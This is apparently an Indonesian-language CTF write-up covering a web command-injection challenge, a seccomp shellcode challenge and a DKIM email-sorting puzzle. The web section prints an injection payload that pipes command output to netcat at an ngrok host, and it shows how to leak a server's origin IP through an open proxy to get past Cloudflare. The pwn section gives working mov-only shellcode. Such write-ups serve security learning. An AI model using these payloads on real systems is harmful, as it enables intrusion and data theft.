# web
---
## cloudwhere

pada soal diberikan alamat website dan source code soal https://cloudwhere.lol/
bisa dilihat pada ./src/utils.ts pada bagian:
```node
...snip...
    console.log('requesting_whois', ip)

    try {
        const response = await execAsync(`whois ${ip} | grep -i country | head -n1`)

        console.log(response)
        const country = response.stdout.split(':')[1].trim()
...snip...
```


bahwa disitu ada command injection pada variable response,
variable ip diatas mengambil data ip dari ./src/middleware.ts 

```node
...snip...
export function checkIpHeader(request: Request, h: ResponseToolkit) {
    request.app.realIp = request.headers['cf-connecting-ip'] || request.info.remoteAddress

    return h.continue
}
...snip...
```

dimana dia mengambil http header cf-connecting-ip sebagai inputnya,
sekarang mari kita inject shellcode dibawah ini ke header cf-connecting-ip:

```sh
cf-connecting-ip: 8.8.8.8; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|ls / 2>&1|nc 6.tcp.ngrok.io 12364 >/tmp/f#
```

![](Pasted%20image%2020221211192759.png)

Tetapi dikarenakan terdapatknya waf dari cloudflare, kita tidak dapat meninjeksi shellcode tersebut. Sehingga kita perlu dapat cara untuk membypass cloudflare tersebut.

Setelah beberapa lama seluncur di internet, saya menemukan vidio ini https://www.youtube.com/watch?v=jfjzYpgte-A

Dimana di vidio itu memberi tahu kita bahwa kita dapat membypass cloudflare dengan cara menemukan ip original dari server korban.

Di ./src/handler.ts terdapat fungsi sebagai berikut:

```node
// Protect the users privacy by proxying 3rd-party requests through our own backend
export async function proxyRequest(request: Request, h: ResponseToolkit): Promise<ResponseObject> {
    const url: string = base64decode(request.params.endpoint)

    console.log('proxy_request', url)

    if (!url.startsWith('https://')) {
        return h.response('invalid url')
            .code(401);
    }

    const resp = await fetch(url)

    return h.response(new Buffer(await resp.arrayBuffer()))
        .type(resp.headers.get('content-type') || 'text/plain')
}
```

dimana fungsi proxyRequests akan mengfetch https request dari server apapun!

Fungsi ini dapat kita akses lewat endpoint /proxy/

Jadi rencananya kita akan membuat requestbin, dan membuat request dari website korban ke requestbin kita untuk me leak ip asli dari server korban. 

![](Pasted%20image%2020221211192912.png)

![](Pasted%20image%2020221211192926.png)

dari ip yang kita dapat diatas, kita dapat mengakses ip asli si korban dan membuat shellcode seperti sebelumnya, dan mendapatkan flag nya tanpa perlu khawatir dengan waf cloudflare. 

![](Pasted%20image%2020221211192941.png)

![](Pasted%20image%2020221211192953.png)

yay kita mendapatkan RCE

# pwn
---
## movsh

Pada challenge ini kita di berikan beberapa restriction, yang pertama adalah seccomp:

```c
void init_syscall_filter() {
    // allow only four syscalls: open, read, write and exit
    // the process is killed on execution of any other syscall
    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    seccomp_load(ctx);
}
```

kita hanya bisa menggunakan beberapa syscall, yaitu open, read, write, dan exit.

dari bagian servernya sendiri kita juga diberikan restriction:

```python
def verify_shellcode(shellcode):
    # bypassing this filter is not intended
    # however if you come up with a bypass feel free to use it
    syscall_count = 0
    for i in md.disasm(shellcode, 0x0):
        if i.mnemonic != "mov" and i.mnemonic != "syscall":
            print("Invalid instruction: ")
            print(f"{hex(i.address)}:\t{i.mnemonic}\t{i.op_str}")
            exit(0)
        elif i.mnemonic == "syscall":
            if syscall_count < 2:
                syscall_count += 1
            else:
                print(f"Syscall limit reached @ {hex(i.address)}")
                exit(0)
        else:
            pass
```

dimana kita hanya bisa menggunakan mov dan syscall. syscall hanya boleh ada 2 dalam pyload kita.

```python
def main():
    signal.signal(signal.SIGALRM, handler)
    signal.alarm(60)
    print(f"Please provide the shellcode in hex format ({MAX_SHELLCODE_LEN} bytes at most)")
    shellcode_hex = input("> ")[:MAX_SHELLCODE_LEN].strip().encode().lower()
    
    try:
        shellcode_hex = bytes(list(filter(lambda c: chr(c) in "0123456789abcdef", shellcode_hex)))
        shellcode = bytes.fromhex(shellcode_hex.decode())
        verify_shellcode(shellcode)

        # exit properly
        shellcode += b"\xb8\x3c\x00\x00\x00\x0f\x05"  # mov eax, 0x3c; syscall;
        execute(shellcode)
    except:
        print("Invalid input")
```

namun pada variable shellcode, shellcode yang akan kita masukkan ditambahkan dengan mov eax, 0x3c; syscall;

![](Pasted%20image%2020221211193146.png)

pada percakapan di discord kitctfctf di atas, kita mengetahui bahwa kita bisa merubah mov  eax, 0x3c menjadi nop; dengan cara menambahkan binary 0x0f, 0x1f ke dalam akhir payload.

payload akhir

```asm
    /* push b'flag.txt\x00' */
    mov dword ptr [rsp], 0x67616c66
    mov dword ptr [rsp+4], 0x7478742e
    mov byte ptr [rsp+8], 0
    /* call open('rsp', 'O_RDONLY', 0x64) */
    mov al, SYS_open /* 2 */
    mov rdi, rsp
    mov edx, 0x64
    mov esi, 0 /* O_RDONLY */
    syscall
    /* call read('rax', 'rsp', 'rdx') */
    mov edi, eax
    mov al, SYS_read
    mov rsi, rsp
    syscall
    /* call write(0, 'rsp', 'rax') */
    mov edx, eax
    mov al, SYS_write /* 1 */
    mov edi, 0
    mov rsi, rsp
    .byte 0x0f, 0x1f

    /* exit syscall from the server mov eax, 0x3c; syscall; */
    // .byte 0xb8,0x3c,0x00,0x00,0x00,0x0f,0x05
```

kita rubah menjadi hex, kirim ke server dan kita mendapatkan flag di local! 

![](Pasted%20image%2020221211193234.png)

# misc
---
## ein-pfund-mails

Di challenge ini kita diberikan banyak sekali file, dan dari file-file ini kita harus mendapatkan satu file email yang benar. Disini kita bisa memverify email yang valid dengan memeriksa signature dkimnya. Berikut solver yang saya gunakan:

```python
import glob
from io import BufferedReader
import dkim
import threading

file_list = glob.glob('./mails/*.eml')
count = 0
num_file = len(file_list)

def verify(fp: BufferedReader):
    mail = fp.read()
    isTrue = dkim.verify(mail)
    if isTrue:
        print(mail)
    

for file in file_list:
    with open(file, 'rb') as fp:
        new_thread = threading.Thread(target=verify, args=[fp])
        new_thread.start()
        if threading.active_count()%20 == 0:
            for i in threading.enumerate():
                if i != threading.main_thread():
                    i.join()
        count += 1
        print(f"{count}/{num_file}", end="\r")
```
